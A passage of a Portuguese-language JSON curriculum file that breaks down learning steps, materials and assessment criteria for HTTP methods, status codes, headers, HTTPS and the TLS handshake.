                                    "Compare PUT com PATCH (não coberto aqui, mas note a diferença de parcial vs total)."
                                  ],
                                  "verification": "Simule requisições PUT e DELETE em JSONPlaceholder e confirme mudanças/remoções via GET subsequente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Postman ou Insomnia, API de teste JSONPlaceholder (jsonplaceholder.typicode.com)",
                                  "tips": "PUT substitui todo o recurso; use com ID no URL para precisão.",
                                  "learningObjective": "Dominar PUT e DELETE, incluindo idempotência e status codes esperados.",
                                  "commonMistakes": "Confundir PUT com POST (PUT é para update específico); esquecer que DELETE pode ser chamado múltiplas vezes sem erro."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Exemplificar e Comparar Todos os Métodos HTTP",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: método, ação, idempotente?, body?, exemplo.",
                                    "Desenvolva um fluxo CRUD completo usando os 4 métodos em uma app fictícia (ex: gerenciador de tarefas).",
                                    "Teste cenários de erro: 404 para DELETE inexistente, 400 para POST inválido.",
                                    "Discuta segurança: HTTPS para todos, especialmente POST/PUT.",
                                    "Registre exemplos em um documento pessoal."
                                  ],
                                  "verification": "Apresente a tabela e o fluxo CRUD, executando ao vivo em uma ferramenta.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Editor de texto ou Google Docs para tabela, browser dev tools para inspecionar requisições reais",
                                  "tips": "Use dev tools do browser (F12 > Network) para ver métodos em sites reais como login forms.",
                                  "learningObjective": "Integrar conhecimento dos 4 métodos em exemplos práticos e comparações.",
                                  "commonMistakes": "Ignorar status codes; sempre cheque 2xx para sucesso, 4xx/5xx para erros."
                                }
                              ],
                              "practicalExample": "Em um e-commerce, use GET /produtos para listar itens, POST /carrinho para adicionar produto, PUT /carrinho/123 para atualizar quantidade, DELETE /carrinho/123 para remover. Teste com Postman em uma API mock como JSONPlaceholder simulando endpoints.",
                              "finalVerifications": [
                                "Liste os 4 métodos HTTP comuns e suas ações principais sem hesitação.",
                                "Explique idempotência para GET, PUT, DELETE vs POST.",
                                "Forneça um exemplo URL e body para cada método em contexto de users API.",
                                "Identifique status codes corretos: 200, 201, 204, 404.",
                                "Demonstre execução de CRUD completo em ferramenta de teste.",
                                "Compare métodos em uma tabela precisa."
                              ],
                              "assessmentCriteria": [
                                "Precisão nas definições e exemplos (90% correto).",
                                "Compreensão de idempotência e impactos em retries.",
                                "Uso correto de syntax em requisições (headers, body).",
                                "Identificação de erros comuns e status codes.",
                                "Aplicação em cenário realista (CRUD).",
                                "Clareza na tabela comparativa e explicações."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Uso de HTTPS para proteger dados em POST/PUT.",
                                "Banco de Dados: Mapeamento de métodos HTTP para operações SQL (SELECT, INSERT, UPDATE, DELETE).",
                                "Desenvolvimento Web: Integração com JavaScript fetch() ou Axios.",
                                "Redes de Computadores: Camada de aplicação no modelo OSI/TCP-IP."
                              ],
                              "realWorldApplication": "Em aplicações como redes sociais (GET feed, POST like, PUT profile, DELETE post), APIs de delivery (GET pedidos, POST novo pedido), ou qualquer backend RESTful para gerenciar recursos de forma escalável e previsível."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.3.1"
                            ]
                          },
                          {
                            "id": "10.1.1.3.2.3",
                            "name": "Interpretar códigos de status HTTP",
                            "description": "Classificar e exemplificar: 2xx (sucesso, ex: 200 OK), 3xx (redirecionamento), 4xx (erro cliente, ex: 404 Not Found), 5xx (erro servidor).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura geral dos códigos de status HTTP",
                                  "subSteps": [
                                    "Explicar que os códigos de status HTTP são números de três dígitos na resposta do servidor.",
                                    "Identificar o significado da primeira cifra: 1xx (informativo), 2xx (sucesso), 3xx (redirecionamento), 4xx (erro do cliente), 5xx (erro do servidor).",
                                    "Analisar exemplos iniciais: 200 (OK), 404 (Not Found).",
                                    "Diferenciar entre famílias de códigos e suas implicações gerais.",
                                    "Consultar a lista oficial de códigos no RFC 9110 ou MDN Web Docs."
                                  ],
                                  "verification": "Listar corretamente as cinco famílias principais e dar um exemplo de cada uma.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação MDN HTTP Status Codes",
                                    "Navegador web com DevTools"
                                  ],
                                  "tips": "Sempre foque na primeira cifra para classificação rápida; memorize as famílias antes dos códigos específicos.",
                                  "learningObjective": "Entender o formato e a classificação básica dos códigos de status HTTP.",
                                  "commonMistakes": [
                                    "Confundir 4xx com 5xx",
                                    "Ignorar a importância da primeira cifra",
                                    "Achar que todos os 2xx são iguais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dominar os códigos de status 2xx (Sucesso)",
                                  "subSteps": [
                                    "Estudar 200 OK: requisição bem-sucedida.",
                                    "Analisar 201 Created: recurso criado com sucesso.",
                                    "Explorar 204 No Content: sucesso sem corpo na resposta.",
                                    "Exemplificar cenários: POST criando usuário (201), GET de página (200).",
                                    "Testar em DevTools acessando uma página válida."
                                  ],
                                  "verification": "Classificar e exemplificar pelo menos três códigos 2xx corretamente.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "DevTools do Chrome/Firefox",
                                    "Site de teste como httpbin.org"
                                  ],
                                  "tips": "Use ferramentas como Postman para simular requisições e ver respostas 2xx.",
                                  "learningObjective": "Reconhecer e exemplificar respostas de sucesso no HTTP.",
                                  "commonMistakes": [
                                    "Confundir 200 com 201",
                                    "Achar que 204 sempre retorna dados",
                                    "Não testar na prática"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar códigos 3xx (Redirecionamento) e 4xx (Erro do Cliente)",
                                  "subSteps": [
                                    "Estudar 301/302 Moved Permanently/Temporarily: redirecionamentos.",
                                    "Explorar 404 Not Found: recurso não existe.",
                                    "Analisar 400 Bad Request e 403 Forbidden: erros do cliente.",
                                    "Simular 404 acessando URL inválida e observar redirecionamento 301 em sites.",
                                    "Diferenciar redirecionamento de erro: cliente deve agir no 3xx/4xx."
                                  ],
                                  "verification": "Explicar diferenças entre 301/302 e identificar causas comuns de 404/403.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Postman ou curl",
                                    "Documentação HTTPstatuses.com"
                                  ],
                                  "tips": "Siga redirecionamentos no DevTools para ver a cadeia completa.",
                                  "learningObjective": "Classificar e exemplificar redirecionamentos e erros do cliente.",
                                  "commonMistakes": [
                                    "Confundir 301 com 302",
                                    "Achar que 404 é erro do servidor",
                                    "Ignorar cabeçalhos Location em 3xx"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar códigos 5xx (Erro do Servidor) e integrar conhecimentos",
                                  "subSteps": [
                                    "Estudar 500 Internal Server Error: erro genérico do servidor.",
                                    "Analisar 502 Bad Gateway e 503 Service Unavailable: problemas de proxy/serviço.",
                                    "504 Gateway Timeout: timeout de gateway.",
                                    "Praticar interpretação mista: dado um log de requisições, classificar todos.",
                                    "Criar tabela resumida das famílias com exemplos."
                                  ],
                                  "verification": "Classificar corretamente 5 códigos mistos de diferentes famílias.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Logs de servidor exemplo",
                                    "Ferramenta online como reqbin.com"
                                  ],
                                  "tips": "Em produção, 5xx indicam necessidade de contato com suporte; nunca culpe o cliente.",
                                  "learningObjective": "Identificar erros do servidor e sintetizar todo o conhecimento.",
                                  "commonMistakes": [
                                    "Confundir 5xx com 4xx",
                                    "Subestimar impacto de 503 em escalabilidade",
                                    "Não diferenciar 500 de 502"
                                  ]
                                }
                              ],
                              "practicalExample": "Abra o DevTools no navegador (F12), acesse uma página válida (200 OK), uma inexistente (404 Not Found), e um site com redirecionamento HTTP para HTTPS (301/302). Classifique cada status code observado.",
                              "finalVerifications": [
                                "Classificar corretamente pelo menos 10 códigos de status de diferentes famílias.",
                                "Explicar a diferença entre erros do cliente (4xx) e do servidor (5xx).",
                                "Identificar exemplos reais: 200 para GET bem-sucedido, 201 para POST criando recurso.",
                                "Simular e verificar redirecionamentos 3xx em um navegador.",
                                "Criar uma tabela resumida com as cinco famílias e 3 exemplos cada.",
                                "Interpretar um log de requisições HTTP fornecido."
                              ],
                              "assessmentCriteria": [
                                "Precisão na classificação por família (90% correto).",
                                "Capacidade de exemplificar com cenários reais.",
                                "Diferenciação clara entre 4xx e 5xx com razões.",
                                "Uso correto de terminologia (ex: 'sucesso', 'redirecionamento').",
                                "Demonstração prática via DevTools ou ferramenta similar.",
                                "Síntese em tabela ou mapa mental."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Integração com protocolo HTTP e camadas OSI.",
                                "Desenvolvimento Web: Manipulação de status em JavaScript (fetch/axios).",
                                "Segurança da Informação: Identificar 4xx/5xx em ataques como DDoS.",
                                "Banco de Dados: Logs de APIs com status codes em consultas.",
                                "Análise de Sistemas: Monitoramento com ferramentas como ELK Stack."
                              ],
                              "realWorldApplication": "Ao desenvolver APIs REST, interpretar status codes permite debugar erros rapidamente, otimizar redirecionamentos para SEO e monitorar saúde do servidor em produção, evitando downtime em aplicações web escaláveis."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.3.1"
                            ]
                          },
                          {
                            "id": "10.1.1.3.2.4",
                            "name": "Analisar cabeçalhos HTTP",
                            "description": "Explicar cabeçalhos de requisição (Content-Type, Authorization) e resposta (Set-Cookie, Cache-Control), e seu papel na comunicação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura geral dos cabeçalhos HTTP",
                                  "subSteps": [
                                    "Estude a definição de cabeçalhos HTTP como metadados chave-valor na mensagem HTTP.",
                                    "Identifique as seções de uma mensagem HTTP: linha de requisição/resposta, cabeçalhos e corpo.",
                                    "Diferencie cabeçalhos de requisição (enviados pelo cliente) e de resposta (enviados pelo servidor).",
                                    "Revise exemplos básicos usando documentação oficial do HTTP/1.1.",
                                    "Anote a sintaxe: Header-Name: value"
                                  ],
                                  "verification": "Explique verbalmente ou por escrito a diferença entre cabeçalhos de requisição e resposta, com um diagrama simples.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação MDN Web Docs sobre HTTP Headers",
                                    "Editor de texto para anotações"
                                  ],
                                  "tips": "Use cores diferentes para destacar requisição vs. resposta em diagramas.",
                                  "learningObjective": "Entender o papel fundamental dos cabeçalhos na comunicação HTTP.",
                                  "commonMistakes": [
                                    "Confundir cabeçalhos com o corpo da mensagem",
                                    "Ignorar maiúsculas/minúsculas nos nomes dos cabeçalhos (case-insensitive)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar cabeçalhos de requisição comuns",
                                  "subSteps": [
                                    "Examine Content-Type: define o formato do corpo (ex: application/json).",
                                    "Estude Authorization: mecanismos de autenticação (ex: Bearer token).",
                                    "Explore User-Agent: identifica o cliente (browser, app).",
                                    "Pratique identificando Accept: formatos aceitos pelo cliente.",
                                    "Registre exemplos reais de cada cabeçalho."
                                  ],
                                  "verification": "Liste e explique 4 cabeçalhos de requisição com exemplos válidos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta Postman ou curl para simular requisições",
                                    "Lista de cabeçalhos comuns no site IANA"
                                  ],
                                  "tips": "Sempre teste com curl -v para ver headers verbose.",
                                  "learningObjective": "Identificar e explicar o propósito de cabeçalhos de requisição chave.",
                                  "commonMistakes": [
                                    "Esquecer que Content-Type afeta parsing no servidor",
                                    "Usar Authorization sem HTTPS (inseguro)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar cabeçalhos de resposta comuns",
                                  "subSteps": [
                                    "Analise Set-Cookie: define cookies para sessões no cliente.",
                                    "Estude Cache-Control: diretivas de cache (ex: no-cache, max-age).",
                                    "Examine Content-Type na resposta: confirma o tipo retornado.",
                                    "Revise Location: para redirecionamentos (ex: 301/302).",
                                    "Compare com exemplos de respostas reais."
                                  ],
                                  "verification": "Descreva o impacto de Cache-Control em performance e liste 3 diretivas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Browser DevTools (Network tab)",
                                    "Documentação HTTP Cache no MDN"
                                  ],
                                  "tips": "Filtre por requisições falhas no DevTools para ver headers de erro.",
                                  "learningObjective": "Dominar cabeçalhos de resposta e seu controle sobre cliente/servidor.",
                                  "commonMistakes": [
                                    "Confundir Set-Cookie com cookies já existentes",
                                    "Ignorar variações como Cache-Control: private vs. public"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar análise de cabeçalhos em fluxos de comunicação",
                                  "subSteps": [
                                    "Simule um fluxo completo: requisição com Authorization e resposta com Set-Cookie/Cache-Control.",
                                    "Identifique como cabeçalhos afetam segurança, performance e estado.",
                                    "Analise um tráfego real de uma API pública (ex: JSONPlaceholder).",
                                    "Discuta falhas comuns em comunicação devido a headers errados.",
                                    "Crie um checklist para análise de headers."
                                  ],
                                  "verification": "Analise uma requisição real e explique o papel de 3+ headers nela.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Browser Chrome/Firefox DevTools",
                                    "API teste como reqres.in"
                                  ],
                                  "tips": "Ative 'Preserve log' no Network tab para capturar redirecionamentos.",
                                  "learningObjective": "Aplicar análise de headers em cenários reais de comunicação HTTP.",
                                  "commonMistakes": [
                                    "Não considerar chain de requisições (redirecionamentos)",
                                    "Omitir headers de segurança como Strict-Transport-Security"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando DevTools do Chrome, acesse https://reqres.in/api/users, inspecione a requisição POST com Content-Type: application/json e Authorization: Bearer token, e a resposta com Cache-Control: max-age=0 e Set-Cookie para sessão.",
                              "finalVerifications": [
                                "Lista corretamente 5 cabeçalhos comuns de requisição e resposta.",
                                "Explica o impacto de Content-Type em parsing de dados.",
                                "Identifica riscos de segurança em Authorization sem HTTPS.",
                                "Analisa Cache-Control em uma resposta real.",
                                "Cria diagrama de fluxo HTTP com headers destacados.",
                                "Simula erro intencional (header inválido) e corrige."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e explicação de headers (90%+ correto).",
                                "Uso correto de exemplos reais de ferramentas como DevTools/Postman.",
                                "Profundidade na análise de papéis (segurança, performance, estado).",
                                "Checklist pessoal completo para análise de headers.",
                                "Capacidade de debugar problemas comuns via headers.",
                                "Integração com conceitos HTTP mais amplos."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Autenticação via Authorization e cookies seguros.",
                                "Redes de Computadores: Impacto de Cache-Control em latência de rede.",
                                "Desenvolvimento Web: Integração com JavaScript fetch/axios para headers.",
                                "Banco de Dados: Content-Type em APIs REST para JSON/XML.",
                                "Administração de Sistemas: Configuração de headers em servidores (Nginx/Apache)."
                              ],
                              "realWorldApplication": "Em desenvolvimento de APIs web, analisar headers garante autenticação segura (Authorization), otimização de performance (Cache-Control) e compatibilidade de dados (Content-Type), essencial para apps como e-commerces ou dashboards em tempo real."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.3.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.3.3",
                        "name": "Protocolo HTTPS e Segurança",
                        "description": "Diferenças entre HTTP e HTTPS, com foco em criptografia SSL/TLS para proteção de dados na Internet.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.3.3.1",
                            "name": "Definir o protocolo HTTPS",
                            "description": "Explicar HTTPS como HTTP sobre TLS/SSL, utilizando porta 443, para garantir confidencialidade, integridade e autenticação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar o Protocolo HTTP Básico",
                                  "subSteps": [
                                    "Estude a definição de HTTP como protocolo de aplicação stateless para transferência de hipertexto.",
                                    "Identifique as características principais: request-response, métodos (GET, POST), cabeçalhos e status codes.",
                                    "Analise exemplos de comunicação HTTP em navegadores e servidores.",
                                    "Compare tráfego HTTP em ferramentas como Wireshark para visualizar dados em claro.",
                                    "Registre as limitações de segurança do HTTP puro."
                                  ],
                                  "verification": "Resuma em 3 frases o que é HTTP e liste 3 limitações de segurança.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação MDN Web Docs sobre HTTP",
                                    "Wireshark (ferramenta gratuita)",
                                    "Navegador web com DevTools"
                                  ],
                                  "tips": [
                                    "Use DevTools do Chrome para inspecionar requests HTTP reais.",
                                    "Foque em exemplos simples como acessar um site sem HTTPS."
                                  ],
                                  "learningObjective": "Compreender as bases do HTTP para contrastar com HTTPS.",
                                  "commonMistakes": [
                                    "Confundir HTTP com HTML.",
                                    "Ignorar que HTTP é em texto plano."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Introduzir TLS/SSL e Criptografia",
                                  "subSteps": [
                                    "Defina TLS (Transport Layer Security) como sucessor do SSL para criptografia de transporte.",
                                    "Explique chaves simétricas e assimétricas: simétrica para dados, assimétrica para troca de chaves.",
                                    "Estude conceitos de certificados digitais, CAs (Certificate Authorities) e validação de identidade.",
                                    "Diferencie confidencialidade (encriptação), integridade (hash/MAC) e autenticação (certificados).",
                                    "Visualize diagrama de criptografia TLS em recursos online."
                                  ],
                                  "verification": "Desenhe um diagrama simples de chaves assimétricas e explique cada pilar de segurança.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Vídeo Khan Academy sobre criptografia",
                                    "Documentação Mozilla sobre TLS",
                                    "Ferramenta online como TLS Checker"
                                  ],
                                  "tips": [
                                    "Lembre-se: TLS 1.3 é o padrão atual; evite SSLv3 depreciado.",
                                    "Use analogias como cofre para chaves públicas/privadas."
                                  ],
                                  "learningObjective": "Dominar os fundamentos de TLS/SSL como base para HTTPS.",
                                  "commonMistakes": [
                                    "Confundir TLS com SSL como se fossem idênticos.",
                                    "Esquecer o papel das CAs na autenticação."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Compreender HTTPS como HTTP sobre TLS",
                                  "subSteps": [
                                    "Defina HTTPS como HTTP encapsulado em TLS, usando porta TCP 443 por padrão.",
                                    "Descreva o fluxo: cliente inicia conexão TLS antes de enviar requests HTTP.",
                                    "Detalhe o TLS Handshake: ClientHello, ServerHello, troca de chaves, certificados e Finished.",
                                    "Simule o handshake usando ferramentas como openssl s_client.",
                                    "Compare portas: HTTP (80) vs HTTPS (443) em configurações de firewall."
                                  ],
                                  "verification": "Execute um comando openssl para conectar a um site HTTPS e interprete o output do handshake.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "OpenSSL instalado",
                                    "Site HTTPS como google.com",
                                    "Diagrama interativo de TLS Handshake no Cloudflare"
                                  ],
                                  "tips": [
                                    "Teste em terminais: openssl s_client -connect example.com:443.",
                                    "Note o cadeado no navegador como indicador visual."
                                  ],
                                  "learningObjective": "Explicar tecnicamente como HTTP + TLS forma HTTPS.",
                                  "commonMistakes": [
                                    "Pensar que HTTPS muda o formato HTTP.",
                                    "Ignorar que handshake ocorre antes de qualquer dado HTTP."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Garantias de Segurança e Aplicações",
                                  "subSteps": [
                                    "Reúna confidencialidade (encriptação impede eavesdropping), integridade (detecta alterações) e autenticação (verifica servidor).",
                                    "Discuta ataques mitigados: MITM, sniffing, spoofing.",
                                    "Explore HSTS (HTTP Strict Transport Security) para forçar HTTPS.",
                                    "Revise diferenças visuais: URL https://, ícone de cadeado.",
                                    "Planeje configuração básica de HTTPS em um servidor."
                                  ],
                                  "verification": "Liste 3 ataques prevenidos por HTTPS e como cada pilar os mitiga.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Artigo OWASP sobre HTTPS",
                                    "Browser DevTools para inspecionar certificados",
                                    "Documentação Let's Encrypt"
                                  ],
                                  "tips": [
                                    "Sempre verifique certificados em sites sensíveis.",
                                    "HTTPS é obrigatório para SEO moderno pelo Google."
                                  ],
                                  "learningObjective": "Articular os benefícios completos do HTTPS.",
                                  "commonMistakes": [
                                    "Subestimar riscos de HTTP em Wi-Fi públicas.",
                                    "Confundir autenticação mútua com unilateral."
                                  ]
                                }
                              ],
                              "practicalExample": "Ao desenvolver um blog pessoal com login de usuários, configure HTTPS no servidor Nginx: gere uma chave privada e CSR, obtenha certificado gratuito do Let's Encrypt via Certbot, edite nginx.conf para listen 443 ssl, reinicie o serviço e redirecione porta 80 para 443. Teste acessando https://seudominio.com e verifique o cadeado, garantindo que senhas sejam enviadas criptografadas.",
                              "finalVerifications": [
                                "Explicar HTTPS como HTTP sobre TLS na porta 443.",
                                "Descrever os três pilares: confidencialidade, integridade e autenticação.",
                                "Simular um TLS Handshake em sequência.",
                                "Identificar diferenças visuais e funcionais entre HTTP e HTTPS.",
                                "Listar ataques mitigados por HTTPS.",
                                "Configurar redirecionamento básico para HTTPS."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição técnica de HTTPS e componentes TLS.",
                                "Compreensão clara dos três pilares de segurança com exemplos.",
                                "Descrição correta e sequencial do TLS Handshake.",
                                "Identificação precisa da porta 443 e implicações de rede.",
                                "Aplicação prática em cenários reais sem erros conceituais.",
                                "Uso de terminologia padrão (ex: ClientHello, certificados)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos de transporte TCP/UDP e portas.",
                                "Segurança da Informação: Criptografia assimétrica e certificados digitais.",
                                "Desenvolvimento Web: Configuração de servidores Apache/Nginx.",
                                "Administração de Sistemas: Gerenciamento de certificados e HSTS.",
                                "Ética Digital: Proteção de dados pessoais e conformidade GDPR."
                              ],
                              "realWorldApplication": "HTTPS é fundamental em e-commerce (ex: Amazon protege cartões), bancos online (ex: autenticação segura em apps), redes sociais (ex: Facebook logins) e APIs corporativas, prevenindo roubo de dados em trânsito e elevando confiança do usuário, com suporte obrigatório em navegadores modernos."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.3.1"
                            ]
                          },
                          {
                            "id": "10.1.1.3.3.2",
                            "name": "Descrever o handshake TLS",
                            "description": "Detalhar o processo de negociação de chaves: ClientHello, ServerHello, troca de certificados e chaves simétricas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender a mensagem ClientHello",
                                  "subSteps": [
                                    "Examine os componentes principais: versão TLS suportada (ex: TLS 1.3), lista de cipher suites preferidos, random nonce do cliente (32 bytes), extensões como SNI (Server Name Indication).",
                                    "Identifique o papel: cliente inicia a negociação informando capacidades e gerando entropia para chaves futuras.",
                                    "Analise como o ClientHello é enviado em claro (não criptografado) para permitir seleção pelo servidor.",
                                    "Estude exemplos de cipher suites comuns como TLS_AES_256_GCM_SHA384.",
                                    "Note que não há autenticação ainda; foco em negociação inicial."
                                  ],
                                  "verification": "Descreva verbalmente ou por escrito os 4 componentes principais do ClientHello e seu propósito.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação RFC 8446 (TLS 1.3)",
                                    "Diagramas de handshake TLS no site Cloudflare Learning"
                                  ],
                                  "tips": "Use um diagrama visual para memorizar a sequência; foque em 'o que o cliente oferece'.",
                                  "learningObjective": "Compreender a iniciação do handshake pelo cliente e seus elementos chave.",
                                  "commonMistakes": "Confundir random nonce com chave simétrica; lembrar que é apenas entropia inicial."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar ServerHello e envio do certificado",
                                  "subSteps": [
                                    "Descreva ServerHello: servidor seleciona versão TLS, cipher suite, seu random nonce (32 bytes), e confirma extensões.",
                                    "Explique o Certificate: servidor envia cadeia de certificados X.509 assinados por CA confiável para autenticação.",
                                    "Discuta CertificateVerify (em TLS 1.3): prova de posse da chave privada via assinatura.",
                                    "Identifique ServerHelloDone (em TLS 1.2) ou equivalente em 1.3.",
                                    "Verifique como o cliente valida o certificado contra trust store."
                                  ],
                                  "verification": "Liste as mensagens do servidor nesta fase e explique a validação do certificado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta Wireshark para capturar tráfego HTTPS real",
                                    "Explicação TLS no Mozilla Developer Network (MDN)"
                                  ],
                                  "tips": "Capture um handshake real com Wireshark para ver na prática; filtre por 'tls.handshake'.",
                                  "learningObjective": "Dominar a resposta do servidor, incluindo autenticação via certificado.",
                                  "commonMistakes": "Ignorar a importância da cadeia de certificados; assumir que ServerHello criptografa tudo."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Compreender a troca de chaves simétricas",
                                  "subSteps": [
                                    "Explique geração do Pre-Master Secret pelo cliente (baseado em Diffie-Hellman ou RSA).",
                                    "Descreva ClientKeyExchange: cliente envia chave pública efêmera ou encrypted pre-master.",
                                    "Detalhe derivação da Master Secret: combinação de client random, server random e pre-master via HKDF/PRF.",
                                    "Gere chaves de sessão simétrica: encryption key, MAC key, IV a partir da master secret.",
                                    "Note transição para criptografia: após isso, mensagens são protegidas."
                                  ],
                                  "verification": "Desenhe o fluxo de derivação de chaves e calcule um exemplo simplificado com números.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Simulador TLS Handshake online (ex: tls13.ulfheim.net)",
                                    "RFC 8446 seção de Key Schedule"
                                  ],
                                  "tips": "Pense em 'randoms + pre-master → master → session keys'; use cores em diagramas para rastrear.",
                                  "learningObjective": "Explicar matematicamente como chaves simétricas são negociadas de forma segura.",
                                  "commonMistakes": "Confundir pre-master com master secret; esquecer papel dos nonces na forward secrecy."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Finalizar o handshake com mensagens de confirmação",
                                  "subSteps": [
                                    "Descreva ChangeCipherSpec: sinaliza uso de novas chaves (não parte do handshake propriamente).",
                                    "Explique Finished: cada lado envia hash criptográfico de todo handshake para verificação de integridade.",
                                    "Confirme mutual authentication e session resumption possibilities.",
                                    "Resuma benefícios: confidencialidade, integridade, autenticação após handshake.",
                                    "Compare TLS 1.2 vs 1.3 (0-RTT, menos round trips)."
                                  ],
                                  "verification": "Simule o handshake completo em papel ou ferramenta e identifique onde falha se certificado inválido.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Vídeo 'TLS Handshake Explained' no YouTube (Inside TLS)",
                                    "Checklist TLS no OWASP Cheat Sheet"
                                  ],
                                  "tips": "Memorize sequência: ClientHello → ServerHello+Cert → KeyExchange → Finished ambos lados.",
                                  "learningObjective": "Concluir o entendimento do ciclo completo e suas garantias de segurança.",
                                  "commonMistakes": "Achar que handshake termina em ServerHello; ignorar Finished para detecção de MITM."
                                }
                              ],
                              "practicalExample": "Use Wireshark para capturar uma conexão HTTPS a google.com: filtre 'tls.handshake', identifique ClientHello (pacote 1), ServerHello+Certificate (pacotes 2-4), ClientKeyExchange (pacote 5), e Finished (pacotes 6-7). Anote cipher suite escolhido (ex: TLS_AES_128_GCM_SHA256).",
                              "finalVerifications": [
                                "Liste todas as mensagens principais em ordem cronológica com propósitos.",
                                "Explique como forward secrecy é alcançada via ephemeral keys.",
                                "Identifique 3 diferenças chave entre TLS 1.2 e 1.3 handshake.",
                                "Descreva o que acontece se certificado do servidor falhar na validação.",
                                "Calcule manualmente (simplificado) uma master secret de sample randoms.",
                                "Simule detecção de replay attack via nonces."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sequência de mensagens (100% cobertura dos 4 passos principais).",
                                "Profundidade na explicação de key derivation (HKDF/PRF corretos).",
                                "Uso correto de terminologia (ClientHello vs ServerHello, pre-master vs master).",
                                "Inclusão de autenticação e criptografia aspectos (certificados, Finished).",
                                "Capacidade de relacionar a ataques reais (ex: sem PFS, risco de decrypt futuro).",
                                "Clareza em diagramas ou descrições visuais fornecidas."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Criptografia assimétrica (RSA/DH) e funções hash (SHA-256).",
                                "Redes: Protocolos de camada transporte (TCP sob HTTPS).",
                                "Segurança da Informação: Autenticação, confidencialidade, MITM prevention.",
                                "Desenvolvimento Web: Implementação em bibliotecas como OpenSSL ou Node.js TLS."
                              ],
                              "realWorldApplication": "Em aplicações web como e-commerce (ex: checkout seguro no Shopify), banking apps (HTTPS protege credenciais), ou APIs (garante que dados de usuários não sejam interceptados em Wi-Fi público), o handshake TLS estabelece sessão segura em milissegundos, habilitando bilhões de transações diárias sem vazamentos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.3.1"
                            ]
                          },
                          {
                            "id": "10.1.1.3.3.3",
                            "name": "Identificar benefícios e riscos da segurança HTTPS",
                            "description": "Discutir proteção contra eavesdropping, MITM; importância de certificados válidos (CA) e problemas como certificados autoassinados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos do HTTPS",
                                  "subSteps": [
                                    "Explique a diferença entre HTTP e HTTPS, destacando o uso de TLS/SSL no HTTPS.",
                                    "Descreva o processo de handshake TLS: cliente envia ClientHello, servidor responde com ServerHello e certificado.",
                                    "Identifique os componentes principais: criptografia assimétrica para troca de chaves e simétrica para dados.",
                                    "Pesquise e liste as versões do TLS (ex: TLS 1.2 vs 1.3) e por que versões antigas são arriscadas.",
                                    "Visualize o fluxo de handshake usando diagramas online ou ferramentas como Wireshark."
                                  ],
                                  "verification": "Resuma o handshake TLS em um diagrama simples desenhado à mão ou digital.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Mozilla sobre TLS",
                                    "Vídeo Khan Academy sobre criptografia",
                                    "Ferramenta Wireshark (gratuita)"
                                  ],
